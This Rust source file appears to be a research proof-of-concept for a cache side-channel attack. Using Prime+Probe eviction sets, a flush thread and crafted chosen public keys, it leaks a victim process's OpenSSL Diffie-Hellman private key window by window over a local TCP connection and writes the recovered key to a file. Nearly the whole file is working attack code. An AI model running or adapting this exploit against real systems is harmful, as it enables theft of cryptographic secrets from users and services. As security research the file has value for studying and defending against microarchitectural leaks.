use crypto_attacker::*;
use libaugury_ffi_sys::{c_sleep, pin_cpu, flush_evset};
// std lib
use std::env::args;
use std::mem::size_of;
use std::sync::atomic::Ordering;
use std::sync::atomic::compiler_fence;
use std::collections::HashMap;
use std::sync::mpsc::{self, TryRecvError};
use std::thread;
use std::time::Instant;
// file lib
use std::fs::{File, read, read_to_string};
use std::io::{Write, Read};
// network lib
use std::net::TcpStream;
// random value lib
use rand::{Rng, thread_rng};
// mmap lib
use mmap_rs::MmapOptions;
// opessl lib
use openssl::bn::{BigNum, BigNumContext, BigNumRef, BigNumMontgomeryContext};
use openssl::dh::Dh;
use openssl::error::ErrorStack;
// P+P lib
use evict_rs::timer::Timer;
use evict_rs::MyTimer;
use evict_rs::{eviction_set_gen64,
    prime_with_dependencies, probe_with_dependencies, 
    evset_vec_to_evset, evset_vec_set_offset};
use evict_rs::allocator::Allocator;
use evict_rs::eviction_set::EvictionSet;

fn bn_print(number: &BigNumRef) {
    let number_vec = number.to_vec();

    for element in &number_vec {
        print!("{element:02x} ");
    }
    println!("");
}

// Warning: Number may be too large to fit into an i32
fn bn_to_i32(number:&BigNumRef) -> i32 {
    return match number.to_dec_str() {
        Ok(string) => string.parse::<i32>().unwrap(),
        Err(_e) => panic!("BigNumRef.to_dec_str")
    };
}

fn bn_get_lsb_n(number:&BigNumRef, n: i32) -> i32 {
    let mut number_copy = number.to_owned().unwrap();
    number_copy.mask_bits(n).unwrap();
    bn_to_i32(&number_copy)
}

fn create_number_from_ptr_value(
    ptr_value: u64, 
    number_of_pointers: usize, 
    rng: &mut impl Rng
) -> Result<BigNum, ErrorStack> {
    let mut number_string = String::from("0000000000000000");

    for _ in 0..number_of_pointers {
        let ptr_string = &format!("{:x}", ptr_value);
        number_string += &format!("{:0>16}", ptr_string);
    }
    let rnd_string = &format!("{:x}", rng.gen::<u64>());
    number_string += &format!("{:0>16}", rnd_string);
    BigNum::from_hex_str(&number_string)
}

// Returns the `n`th root of `number` in group with prime modulus `modulus`
fn get_nth_root(chosen_public_key: &mut BigNumRef, pointer_m: &BigNumRef, prefix_bn: &BigNumRef, modulus: &BigNumRef, bn_ctx: &mut BigNumContext) {
    // Calculate inverse of n in group one smaller than the order of the prime modulus
    let mut exponent_group_modulus = BigNum::new().unwrap();
    exponent_group_modulus.checked_sub(&modulus, &BigNum::from_u32(1).unwrap()).unwrap();

    let mut inverse = BigNum::new().unwrap();
    inverse.mod_inverse(&prefix_bn, &exponent_group_modulus, bn_ctx).unwrap();

    // Test that inverse is correct
    let mut product = BigNum::new().unwrap();
    product.mod_mul(&prefix_bn, &inverse, &exponent_group_modulus, bn_ctx).unwrap();

    if !product.eq(&BigNum::from_u32(1).unwrap()) {
        panic!("Inverse is incorrect.");
    }

    // Raise the base to the power inverse
    chosen_public_key.mod_exp(&pointer_m, &inverse, &modulus, bn_ctx).unwrap();
}

fn dh_hacker(
    mut stream: TcpStream,
    victim_array_cache_lines: &mut Vec<*mut u8>,
    repetitions: usize,
    pp_threshold: u64,
    num_group: usize,
    flush_ptr: *mut u64,
    victim_cl_start: u64,
    victim_cl_end: u64,
    victim_buf_offset: u64,
    timer: &MyTimer,
    mut bench_time_file: &File
) {
// --------------------------------Initialization-------------------------------
    // TCP setting
    let mut big_data = [0u8; 256];
    let mut msg_data = [0u8; 1];

    // param
    let prime_length: u32 = 2048;
    let window_size: u32 = 6;
    let num_pointers: usize = (prime_length / 64 - 2) as usize;
    let zeroth_window_length_in_bits: u32 = prime_length % window_size;
    let rest_of_pk_length_in_bits: u32 = prime_length - zeroth_window_length_in_bits;
    let count_full_size_windows: u32 = rest_of_pk_length_in_bits / window_size;
    let dh_params_pem = read("./dh_params.pem").expect("Unable to read dh parameter");
    let dh_params = Dh::params_from_pem(&dh_params_pem).unwrap();
    let prime_modulus_bn = dh_params.prime_p().to_owned().unwrap();
    // generate new key
    let dh_victim = dh_params.generate_key().unwrap();
    let dh_public_key = dh_victim.public_key();
    assert_eq!(dh_public_key.is_negative(), false);
    let pk_msg = dh_public_key.to_vec_padded(256).unwrap();

    // context initialization
    let mut bn_ctx = BigNumContext::new().unwrap();
    let mut mont_ctx = BigNumMontgomeryContext::new().unwrap();
    match mont_ctx.init(&prime_modulus_bn, &mut bn_ctx) {
        Ok(_) => (),
        Err(error) => panic!("Montgomery context set failed with error {}", error)
    };

    // measurement valuable
    let mut __trash: u64 = 0;
    let mut test_time: u64;
    let mut rng = thread_rng();

// --------------------------------Calibration-----------------------------
    println!("--------------------------------Calibration-----------------------------");
    // The goal of Calibration stage
    // Try different combination of ptr sequence / flush thread / guess number / p+p to window 0
    let mut target_addr: u64 = 0;
    let flush_ptr_value: u64 = flush_ptr as u64;
    let mut global_pp_idx: usize = 0;
    let mut profile_base_vec = vec![]; // store profile result for base
    let mut profile_atk_vec = vec![];  // store profile result for atk
    
    // divide evset group into conflict and non-conflict
    let mut non_conflict_set = vec![];
    let mut target_ptr_offset: u64;
    let mut offest_trials: u64 = 0;
    evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, victim_buf_offset as usize, 
        0, NUM_EVSETS/num_group, flush_ptr);

    // create flush thread
    let (tx, rx) = mpsc::channel();
    let _handle = thread::spawn(move || {
        unsafe{ pin_cpu(5); }
        loop {
            unsafe{ flush_evset(flush_ptr_value as *mut u64, (NUM_EVSETS / num_group * L2_CACHE_WAYS) as u32); }

            match rx.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    match rx.recv() {
                        Ok(_) => {},
                        Err(_) => {break;}
                    }
                },
                Err(TryRecvError::Empty) => {}
            };
        };
    });
    // Stop flush thread
    __trash = match tx.send(__trash) {
        Ok(_) => {unsafe{ c_sleep(0, __trash) }},
        Err(_) => {panic!("Send Error");}
    };
    println!("[+] Flush thread is created!");
    let cevset_now = Instant::now();
    loop {
        target_ptr_offset = rng.gen::<u64>() & 0x3f80;
        if (target_ptr_offset == victim_buf_offset) || (target_ptr_offset == victim_buf_offset + 128) {
            println!("The same as victim array offset!");
            continue;
        }
        println!("[+] Set Target Pointer Offset as {:#x}", target_ptr_offset);
        let mut conflict_times: u64 = 0;
        let mut conflict_set = vec![];
        for i in 0..NUM_EVSETS {
            // one iteration
            // fetch prime+probe evset
            let mut result_evset: Vec<*mut u8> = Vec::new();
            evset_vec_to_evset(&victim_array_cache_lines, 
                &mut result_evset, L2_CACHE_WAYS, target_ptr_offset as usize, i);
            let evset_victim_buf = EvictionSet::new(&mut result_evset);
    
            let mut times_to_load_test_ptr_atk = vec![];
    
            for _ in 0..repetitions {
                // send request
                msg_data[0] = !(__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();
                // stream.flush().unwrap();
                // receive pubkey from victim
                stream.read_exact(&mut big_data).unwrap();
                // Resume flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };
    
                __trash = unsafe{c_sleep(1500000, __trash)};
                compiler_fence(Ordering::SeqCst);
    
                __trash = prime_with_dependencies(&evset_victim_buf, __trash);
                compiler_fence(Ordering::SeqCst);
    
                // send pubkey
                stream.write_all(&pk_msg).unwrap();
                // stream.flush().unwrap();
                // receive finish signal
                stream.read_exact(&mut msg_data).unwrap();
    
                __trash += msg_data[0] as u64;
                // Stop flush thread
                __trash = match tx.send(__trash) {
                    Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                    Err(_) => {panic!("Send Error");}
                };

                __trash = unsafe{c_sleep(15000, __trash)};
                compiler_fence(Ordering::SeqCst);
    
                // measure microarchitectural state
                test_time = probe_with_dependencies(timer, &evset_victim_buf, __trash);
                times_to_load_test_ptr_atk.push(test_time);
            }
            times_to_load_test_ptr_atk.sort();
            let median_test = times_to_load_test_ptr_atk[(times_to_load_test_ptr_atk.len() / 2 - 1) as usize];
            if median_test >= pp_threshold {
                conflict_times += 1;
                conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            } else {
                non_conflict_set.push(i);
                println!("Conflict times/Non-conflict times: {}/{} -> {}", conflict_times, i+1, median_test);
            }
        }
        println!("[+] Conflict set: {}; Non-conflict set: {}", conflict_set.len(), non_conflict_set.len());
    
        if non_conflict_set.len() <= 5 {
            println!("Number of Non-conflict set is not enough, try different page offset for target pointer");
            non_conflict_set.clear();
            offest_trials += 1;
            if offest_trials >= 3 {
                msg_data[0] = (__trash & MSB_MASK) as u8;
                stream.write_all(&msg_data).unwrap();
                panic!("3 times bad conflict tests!");
            }
        } else {
            break;
        }
    }

    // Even number depth dictionary
    let mut square_root_dic = HashMap::new();
    for even_number in (2..(2_i32.pow(window_size)+2) as u32).step_by(2) {
        let mut temp_even: u32 = even_number;
        let mut root_depth: u32 = 0;
        while temp_even % 2 == 0 {
            root_depth += 1;
            temp_even /= 2;
        }
        square_root_dic.insert(even_number % 2_i32.pow(window_size) as u32, root_depth);
    }

    // Try different gadget settings
    let mut gadget_flag = 0;
    for pp_idx in 0..non_conflict_set.len() {
        // fix prime+probe channel
        let mut pp_evset_vec_cur: Vec<*mut u8> = Vec::new();
        evset_vec_to_evset(&victim_array_cache_lines, 
            &mut pp_evset_vec_cur, L2_CACHE_WAYS, target_ptr_offset as usize, non_conflict_set[pp_idx]);
        global_pp_idx = non_conflict_set[pp_idx];
        assert_eq!(pp_evset_vec_cur.len(), L2_CACHE_WAYS);
        let pp_evset = EvictionSet::new(&mut pp_evset_vec_cur);
        println!("[+] P+P Evset {} Fixed!", pp_idx);
        let mut pp_bad_flag = 0;
        
        // try different target addr
        let mut target_addr_page = victim_cl_start;
        let mut num_target_addr_tries = 0;
        while target_addr_page < victim_cl_end {
            target_addr = target_addr_page + target_ptr_offset;
            num_target_addr_tries += 1;
            println!("[+] Try {}: Pick Target addr:{:#x} for P+P set {}", num_target_addr_tries, target_addr, pp_idx);

            // Compute square root dictionary
            let mut pointer_reduction_list = vec![];
            loop {
                // randomly generate pointer
                let mut target_pointer = match create_number_from_ptr_value(target_addr, num_pointers, &mut rng) {
                    Ok(result) => result,
                    Err(error) => panic!("Generate random pointer sequence {}", error)
                };
        
                // get montgomery form of pointer
                let mut pointer_m: BigNum = BigNum::new().unwrap();
                pointer_m.from_montgomery(&target_pointer, &mut mont_ctx, &mut bn_ctx).unwrap();

                // generate square root dictionary
                let mut temp_pointer_1 = pointer_m.to_owned().unwrap();
                pointer_reduction_list.push(pointer_m);
                let mut success_flag = 1;
                // how many sqrt should be applied
                for _ in 0..(zeroth_window_length_in_bits+window_size) {
                    let mut temp_pointer_2: BigNum = BigNum::new().unwrap();
                    match temp_pointer_2.mod_sqrt(&temp_pointer_1, &prime_modulus_bn, &mut bn_ctx) {
                        Ok(_) => (),
                        Err(_error) => {success_flag = 0; pointer_reduction_list.clear(); break;}
                    };
                    temp_pointer_1 = temp_pointer_2.to_owned().unwrap();
                    pointer_reduction_list.push(temp_pointer_2);
                }
                if success_flag == 1 {
                    println!("[+] Chosen Pointer Sequence: ");
                    bn_print(&target_pointer);
                    target_pointer.clear();
                    break;
                }
                target_pointer.clear();
            }

            let mut flush_group_idx = 0;
            let mut noise_times = 0;
            let mut succeed_times = 0;
            while flush_group_idx < num_group {
                let now = Instant::now();
                evset_vec_set_offset(&victim_array_cache_lines, L2_CACHE_WAYS, victim_buf_offset as usize,
                    flush_group_idx, NUM_EVSETS/num_group, flush_ptr);
                println!("[+] Group {}:", flush_group_idx);
                // Compute all possible chosen cipher
                let mut chosen_cipher_list = vec![];
                let mut prefix_temp: BigNum = BigNum::new().unwrap();
                // Try 1 and 2, where 1 must give us the pointer
                for guess_number in 1..3 as u32 {
                    // get chosen_public_key
                    let mut chosen_public_key: BigNum = BigNum::new().unwrap();
                    // Modify the Guess to fit the mul func
                    prefix_temp.lshift(&BigNum::from_u32(guess_number).unwrap(), window_size as i32).unwrap();
                    // get rid of odd factor
                    let mut cur_reduction_times: usize;
                    if guess_number % 2 == 0 {
                        cur_reduction_times = square_root_dic.get(&guess_number).unwrap().to_owned() as usize;
                    } else {
                        cur_reduction_times = 0;
                    }
                    cur_reduction_times += square_root_dic.get(&0).unwrap().to_owned() as usize;

                    let mut prefix_reduction: BigNum = BigNum::new().unwrap();
                    prefix_reduction.rshift(&prefix_temp, cur_reduction_times as i32).unwrap();
                    let pointer_reduction = pointer_reduction_list[cur_reduction_times].to_owned().unwrap();
                    get_nth_root(&mut chosen_public_key, &pointer_reduction, &prefix_reduction, &prime_modulus_bn, &mut bn_ctx);
                    assert_eq!(chosen_public_key.is_negative(), false);
                    chosen_cipher_list.push(chosen_public_key);
                }
                println!("[+] Finish generating chosen-cipher!");

                let mut guess_number: u32 = 0;

                println!("[+] Begin to do microarchitectural measurement!");

                // Initial vectors to store results
                let mut times_to_load_test_ptr_atk = vec![];
                for _ in 0..repetitions * 2 {
                    // send request
                    msg_data[0] = !(__trash & MSB_MASK) as u8;
                    stream.write_all(&msg_data).unwrap();

                    // receive pubkey from victim
                    stream.read_exact(&mut big_data).unwrap();

                    // Resume flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };

                    // Pick the chosen cipher
                    let mut chosen_public_key = chosen_cipher_list[guess_number as usize | ((__trash & MSB_MASK) as usize)].to_owned().unwrap().to_vec_padded(256).unwrap();
                    __trash = (chosen_public_key[0] as u64) & __trash;

                    __trash = unsafe{c_sleep(1500000, __trash)};

                    compiler_fence(Ordering::SeqCst);

                    __trash = prime_with_dependencies(&pp_evset, __trash);

                    compiler_fence(Ordering::SeqCst);
                    chosen_public_key[0] = chosen_public_key[0] | (__trash & MSB_MASK) as u8;

                    // send pubkey
                    stream.write_all(&chosen_public_key).unwrap();

                    // receive finish signal
                    stream.read_exact(&mut msg_data).unwrap();

                    // stop flush thread
                    __trash += msg_data[0] as u64 & MSB_MASK;
                    // Stop flush thread
                    __trash = match tx.send(__trash) {
                        Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                        Err(_) => {panic!("Send Error");}
                    };

                    compiler_fence(Ordering::SeqCst);

                    // measure microarchitectural state
                    test_time = probe_with_dependencies(timer, &pp_evset, __trash);

                    __trash = test_time | (__trash & MSB_MASK);

                    // store result
                    times_to_load_test_ptr_atk.push(test_time);

                    guess_number = (guess_number + 1) % 2;
                }

                // re-organize latency data
                let mut test_atk_tmp = vec![];
                let mut test_base_tmp = vec![];
                let mut store_offset: usize = 0;

                for _ in 0..repetitions {
                    let test_case_atk = times_to_load_test_ptr_atk[store_offset];
                    test_atk_tmp.push(test_case_atk);
                    let test_case_base = times_to_load_test_ptr_atk[1 + store_offset];
                    test_base_tmp.push(test_case_base);
                    store_offset += 2;
                }
                test_atk_tmp.sort();
                test_base_tmp.sort();
                let median_test_atk: u64 = test_atk_tmp[(test_atk_tmp.len() / 2 - 1) as usize];
                let median_test_base: u64 = test_base_tmp[(test_base_tmp.len() / 2 - 1) as usize];
                println!("Attack: {}", median_test_atk);
                println!("Base: {}", median_test_base);

                if (median_test_base < pp_threshold) && (median_test_atk >= pp_threshold) {
                    succeed_times += 1;
                    noise_times = 0;
                    println!("[+] Get Signal ({})", succeed_times);
                    // add profiling
                    profile_base_vec.append(&mut test_base_tmp);
                    profile_atk_vec.append(&mut test_atk_tmp);
                    if succeed_times >= 3 {
                        gadget_flag = 1;
                        println!("[+] Get Attack Gadgets!");
                        break;
                    }

                } else if (median_test_base < pp_threshold) && (median_test_atk < pp_threshold) {
                    succeed_times = 0;
                    noise_times = 0;
                    flush_group_idx += 1;
                    println!("[+] No signal");
                    profile_base_vec.clear();
                    profile_atk_vec.clear();
                } else {
                    noise_times += 1;
                    succeed_times = 0;
                    println!("[+] Noise Test Environment {}", noise_times);
                    profile_base_vec.clear();
                    profile_atk_vec.clear();
                    if noise_times >= 3 {
                        println!("[+] Try different P+P Evset!");
                        pp_bad_flag = 1;
                        break;
                    }
                }
                let trans_dur = now.elapsed();
                println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
                    trans_dur.subsec_nanos());
            }
            if (gadget_flag == 1) || (pp_bad_flag == 1) {
                break;
            }
            target_addr_page += NATIVE_PAGE_SIZE as u64;
        }
        if gadget_flag == 1 {
            break;
        }
        if target_addr_page >= victim_cl_end {
            msg_data[0] = (__trash & MSB_MASK) as u8;
            stream.write_all(&msg_data).unwrap();
            panic!("Bad address stability!");
        }
    }

    if gadget_flag == 0 {
        msg_data[0] = (__trash & MSB_MASK) as u8;
        stream.write_all(&msg_data).unwrap();
        panic!("[+] Calibration Failure!");
    }
    println!("[+] P+P pair is found!");

    // write profile result
    let mut prof_atk_file = File::create("dh_1.txt").unwrap();
    let mut prof_base_file = File::create("dh_0.txt").unwrap();
    for profile_idx in 0..profile_atk_vec.len() {
        write!(prof_atk_file, "{}\n", profile_atk_vec[profile_idx]).unwrap();
        write!(prof_base_file, "{}\n", profile_base_vec[profile_idx]).unwrap();
    }
    println!("[+] Storing Profile Result!");

    let mut pp_evset_vec: Vec<*mut u8> = Vec::new();
    evset_vec_to_evset(&victim_array_cache_lines, 
        &mut pp_evset_vec, L2_CACHE_WAYS, target_ptr_offset as usize, global_pp_idx);
    let pp_evset = EvictionSet::new(&mut pp_evset_vec);
    write!(bench_time_file, "Compound Evset finding time: {} s\n", cevset_now.elapsed().as_secs()).unwrap();

    // --------------------------------Start Leaking-----------------------------
    println!("--------------------------------Start Leaking-----------------------------");

    // Current Window value
    let mut cur_win: u32;
    // The first window should start with 1 (end 2^6-1), others with 0 (end 2^2-1)
    let mut guess_start: u32;
    let mut guess_end: u32;
    // Reduction times for the previous/cur winodw
    let mut pre_reduction_times: usize;
    let mut cur_reduction_times: usize;

    // Re-compute square root dictionary to tolerant more tailing zeros
    let mut pointer_reduction_list = vec![];
    loop {
        // randomly generate pointer
        let mut target_pointer = match create_number_from_ptr_value(target_addr, num_pointers, &mut rng) {
            Ok(result) => result,
            Err(error) => panic!("Generate random pointer sequence {}", error)
        };

        // get montgomery form of pointer
        let mut pointer_m: BigNum = BigNum::new().unwrap();
        pointer_m.from_montgomery(&target_pointer, &mut mont_ctx, &mut bn_ctx).unwrap();

        // generate square root dictionary
        let mut temp_pointer_1 = pointer_m.to_owned().unwrap();
        pointer_reduction_list.push(pointer_m);
        let mut success_flag = 1;
        // how many sqrt should be applied
        for _ in 0..(5*window_size) {
            let mut temp_pointer_2: BigNum = BigNum::new().unwrap();
            match temp_pointer_2.mod_sqrt(&temp_pointer_1, &prime_modulus_bn, &mut bn_ctx) {
                Ok(_) => (),
                Err(_error) => {success_flag = 0; pointer_reduction_list.clear(); break;}
            };
            temp_pointer_1 = temp_pointer_2.to_owned().unwrap();
            pointer_reduction_list.push(temp_pointer_2);
        }
        if success_flag == 1 {
            println!("[+] Chosen Pointer Sequence: ");
            bn_print(&target_pointer);
            target_pointer.clear();
            break;
        }
        target_pointer.clear();
    }

    // Leak Private Key
    let mut target_window_idx: u32 = 0;
    let mut no_signal_times: u32 = 0;
    let mut guess_prefix =  BigNum::new().unwrap();

    while target_window_idx <= count_full_size_windows {
        // measure the time elapse for each window loop
        let now = Instant::now();
        let mut prefix_bn: BigNum;

        // First window value should no include 0
        if target_window_idx == 0 {
            guess_start = 1;
            guess_end = 2_i32.pow(zeroth_window_length_in_bits) as u32;
        } else {
            guess_start = 0;
            guess_end = 2_i32.pow(window_size) as u32;
        }

        // Compute all possible chosen cipher
        let mut chosen_cipher_list = vec![];
        let mut prefix_temp: BigNum = BigNum::new().unwrap();
        for guess_number in guess_start..guess_end {
            // get chosen_public_key
            let mut chosen_public_key: BigNum = BigNum::new().unwrap();
            // Change the Guess Prefix
            if target_window_idx == 0 {
                prefix_temp.lshift(&BigNum::from_u32(guess_number).unwrap(), window_size as i32).unwrap();
            } else {
                let mut prefix_temp_temp: BigNum = BigNum::new().unwrap();
                prefix_temp_temp.lshift(&guess_prefix, window_size as i32).unwrap();
                let _ = prefix_temp.checked_add(&prefix_temp_temp, &BigNum::from_u32(guess_number).unwrap());
                if target_window_idx != count_full_size_windows {
                    prefix_temp_temp.lshift(&prefix_temp, window_size as i32).unwrap();
                    prefix_temp = prefix_temp_temp.to_owned().unwrap();
                }
            }

            if guess_number % 2 == 0 {
                if guess_number == 0 {
                    let mut prefix_temp_temp: BigNum = guess_prefix.to_owned().unwrap();
                    pre_reduction_times = 0;
                    loop {
                        let cur_window_value: u32 = bn_get_lsb_n(&prefix_temp_temp, window_size as i32) as u32;
                        if cur_window_value != 0 {
                            if cur_window_value % 2 == 0 {
                                pre_reduction_times += square_root_dic.get(&cur_window_value).unwrap().to_owned() as usize;
                            }
                            break;
                        } else {
                            pre_reduction_times += square_root_dic.get(&0).unwrap().to_owned() as usize;
                        }
                        prefix_bn = prefix_temp_temp.to_owned().unwrap();
                        prefix_temp_temp.rshift(&prefix_bn, window_size as i32).unwrap();
                    }
                    cur_reduction_times = pre_reduction_times + square_root_dic.get(&guess_number).unwrap().to_owned() as usize;
                } else {
                    cur_reduction_times = square_root_dic.get(&guess_number).unwrap().to_owned() as usize;
                }
            } else {
                cur_reduction_times = 0;
            }
            if target_window_idx != count_full_size_windows {
                cur_reduction_times += square_root_dic.get(&0).unwrap().to_owned() as usize;
            }
            let mut prefix_reduction: BigNum = BigNum::new().unwrap();
            prefix_reduction.rshift(&prefix_temp, cur_reduction_times as i32).unwrap();
            let pointer_reduction = pointer_reduction_list[cur_reduction_times].to_owned().unwrap();
            get_nth_root(&mut chosen_public_key, &pointer_reduction, &prefix_reduction, &prime_modulus_bn, &mut bn_ctx);
            assert_eq!(chosen_public_key.is_negative(), false);
            chosen_cipher_list.push(chosen_public_key);
        }
        println!("[+] Finish generating chosen-cipher!");

        let mut guess_number: u32 = 0;
        let guess_number_mask: u32 = guess_end - guess_start;

        println!("[+] Begin to do microarchitectural measurement!");

        // Initial vectors to store results
        let mut times_to_load_test_ptr_atk = vec![];
        for _ in 0..repetitions * (guess_number_mask as usize) {
            // send request
            msg_data[0] = !(__trash & MSB_MASK) as u8;
            stream.write_all(&msg_data).unwrap();

            // receive pubkey from victim
            stream.read_exact(&mut big_data).unwrap();

            // Resume flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };

            // Pick the chosen cipher
            let mut chosen_public_key = chosen_cipher_list[guess_number as usize | ((__trash & MSB_MASK) as usize)].to_owned().unwrap().to_vec_padded(256).unwrap();
            __trash = (chosen_public_key[0] as u64) & __trash;

            __trash = unsafe{c_sleep(1500000, __trash)};

            compiler_fence(Ordering::SeqCst);

            __trash = prime_with_dependencies(&pp_evset, __trash);

            compiler_fence(Ordering::SeqCst);
            chosen_public_key[0] = chosen_public_key[0] | (__trash & MSB_MASK) as u8;

            // send pubkey
            stream.write_all(&chosen_public_key).unwrap();

            // receive finish signal
            stream.read_exact(&mut msg_data).unwrap();

            // stop flush thread
            __trash += msg_data[0] as u64 & MSB_MASK;
            // Stop flush thread
            __trash = match tx.send(__trash) {
                Ok(_) => {unsafe{ c_sleep(1500000, __trash) }},
                Err(_) => {panic!("Send Error");}
            };

            compiler_fence(Ordering::SeqCst);

            // measure microarchitectural state
            test_time = probe_with_dependencies(timer, &pp_evset, __trash);

            __trash = test_time | (__trash & MSB_MASK);

            // store result
            times_to_load_test_ptr_atk.push(test_time);

            guess_number = (guess_number + 1) % guess_number_mask;
        }

        // analyze data
        let mut guess_window_value_candidates = vec![];
        for guess_number in guess_start..guess_end {
            let mut store_offset: u32 = 0;
            let mut test_atk_tmp = vec![];
            // Store Measurements
            for _ in 0..repetitions {
                let test_case = times_to_load_test_ptr_atk[(guess_number + store_offset - guess_start) as usize];
                test_atk_tmp.push(test_case);
                store_offset += guess_number_mask;
            }
            test_atk_tmp.sort();
            let median_test = test_atk_tmp[(test_atk_tmp.len() / 2 - 1) as usize];
            if median_test >= pp_threshold {
                println!("get {}: {}", guess_number, median_test);
                guess_window_value_candidates.push(guess_number);
            }
        }

        if guess_window_value_candidates.len() == 1 {
            no_signal_times = 0;
            cur_win = guess_window_value_candidates.pop().unwrap();
            prefix_temp.lshift(&guess_prefix, window_size as i32).unwrap();
            let _ = guess_prefix.checked_add(&prefix_temp, &BigNum::from_u32(cur_win).unwrap());

            println!("[+] Window {} -> {}", target_window_idx, cur_win);
            target_window_idx += 1;
        } else if guess_window_value_candidates.len() == 0 {
            println!("[+] Window {}, no signal, try again!", target_window_idx);
            no_signal_times += 1;
            if no_signal_times > 10 {
                let mut guess_private_key_file = File::create("guess_diffiehellman.txt").unwrap();

                let guess_prefix_vec = guess_prefix.to_vec();
            
                for element in &guess_prefix_vec {
                    write!(guess_private_key_file, "{element:02x}").unwrap();
                }
                println!("[+] No signal for more than 3 times!");
                if target_window_idx >= 1 {
                    prefix_temp.rshift(&guess_prefix, window_size as i32).unwrap();
                    guess_prefix = prefix_temp.to_owned().unwrap();
                    target_window_idx -= 1;
                }
            }
            
        } else {
            continue;
        }
        let trans_dur = now.elapsed();
        println!("[+] Time Elapse: {}s, {}ns", trans_dur.as_secs(), 
            trans_dur.subsec_nanos());
    }
    
    // disconnect the transaction
    msg_data[0] = (__trash & MSB_MASK) as u8;
    stream.write_all(&msg_data).unwrap();

    // store the guess result
    let mut guess_private_key_file = File::create("dh.txt").unwrap();
    let guess_prefix_vec = guess_prefix.to_vec();
    for element in &guess_prefix_vec {
        write!(guess_private_key_file, "{element:02x}").unwrap();
    }
}

fn main() {
    let repetitions = args().nth(1).expect("Enter <repetitions>");
    let pp_threshold = args().nth(2).expect("Enter <prime+probe channel threshold>");
    let num_group = args().nth(3).expect("Enter <number of flush thread group to try>");
    let repetitions = repetitions.parse::<usize>().unwrap();
    let pp_threshold = pp_threshold.parse::<u64>().unwrap();
    let num_group = num_group.parse::<usize>().unwrap();
    assert_eq!(NUM_EVSETS % num_group, 0);

    // load dst array page offset
    let victim_buf_offset_str: Vec<String> = read_to_string("dh_addr.txt").unwrap().lines().map(String::from).collect();
    let victim_buf_offset = match u64::from_str_radix(&(victim_buf_offset_str[0][2..]), 16) {
        Ok(result) => result & 0x3f80,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };

    // load prefetch target search range
    let dyld_space_str: Vec<String> = read_to_string("dyld_space.txt").unwrap().lines().map(String::from).collect();
    println!("[+] Grab dyld search space from file...");
    let victim_cl_start = match u64::from_str_radix(&(dyld_space_str[0][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    let victim_cl_end = match u64::from_str_radix(&(dyld_space_str[1][2..]), 16) {
        Ok(result) => result & 0xffffffffffffc000,
        Err(error) => panic!("Fail to parse memory boundary {}", error)
    };
    println!("[+] Victim Array page offset -> {:#x}", victim_buf_offset);
    println!("[+] Target Pointer start frame -> {:#x}", victim_cl_start);
    println!("[+] Target Pointer end frame -> {:#x}", victim_cl_end);

    unsafe{ pin_cpu(4); }

    // Allocate Precise Flush buffer
    let size_of_flush_buf: usize = size_of::<u64>() * (NUM_EVSETS/num_group) * L2_CACHE_WAYS;
    // Allocate via mmap
    let mut flush_buf_addr = MmapOptions::new(size_of_flush_buf)
        .map_mut()
        .unwrap();
    assert_eq!(size_of_flush_buf, flush_buf_addr.len());

    let flush_bytes = unsafe {
        core::slice::from_raw_parts_mut(
            flush_buf_addr.as_mut_ptr() as *mut u8,
            flush_buf_addr.len(),
        )
    };
    flush_bytes.fill(0x00);

    let flush_ptr = flush_buf_addr.as_mut_ptr() as *mut u64;

    // prepare 64 eviction set groups
    let mut bench_time_file = File::create("dh_bench.txt").unwrap();
    println!("--------------------------------Evsets Preparation-----------------------------");
    let gen64_now = Instant::now();
    let timer = MyTimer::new();
    let mut victim_array_cache_lines: Vec<*mut u8> = Vec::new();
    let mut allocator = Allocator::new(0, NATIVE_PAGE_SIZE);
    eviction_set_gen64(&mut allocator, &mut victim_array_cache_lines, &timer);
    write!(bench_time_file, "64 evset gen time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();

    // connect victim
    match TcpStream::connect("localhost:3333") {
        Ok(stream) => {
            println!("Successfully connected to server in port 3333");
            dh_hacker(stream, &mut victim_array_cache_lines, repetitions, 
                pp_threshold, num_group, flush_ptr, victim_cl_start, 
                victim_cl_end, victim_buf_offset, &timer, &bench_time_file);

        },
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
    println!("Terminated.");
    write!(bench_time_file, "Online time: {} s\n", gen64_now.elapsed().as_secs()).unwrap();
}